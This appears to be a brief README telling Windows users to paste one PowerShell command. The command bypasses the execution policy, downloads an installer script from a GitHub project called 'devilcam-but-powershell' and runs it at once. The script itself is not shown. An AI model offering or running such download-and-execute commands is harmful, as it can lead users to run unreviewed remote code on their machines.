# ONLY RUN IN POWERSHELL
1. PRESS Win + S
2. Type "Windows Powershell"
3. Open
4. Copy the code below and paste
5. Click Enter


```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr 'https://raw.githubusercontent.com/09sychic/devilcam-but-powershell/main/installer.ps1' -OutFile '$env:TEMP\installer.ps1'; & '$env:TEMP\installer.ps1'"
```
